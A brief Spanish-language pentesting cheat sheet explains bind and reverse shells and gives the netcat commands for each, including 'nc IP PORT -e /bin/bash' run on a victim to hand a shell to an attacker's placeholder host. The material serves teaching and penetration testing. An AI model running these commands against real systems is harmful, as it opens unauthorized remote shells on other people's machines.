### Bind Shells
En un Bind Shell, el sistema  `objetivo`  tiene un oyente iniciado y espera una conexión desde el sistema de un pentester (caja de ataque).

#### Victim
```js
nc -lvnp 4444 -e /bin/bash
```
#### Attacker
```js
nc IP PORT
```


### Reverse Shells
En un `reverse shell`, el `HACKER` tendrá un oyente ejecutándose y `LA VICTIMA` deberá iniciar la conexión.
#### Attacker
```js
nc -lvnp 4444
```
#### Victim
```js
nc IP PORT -e /bin/bash
```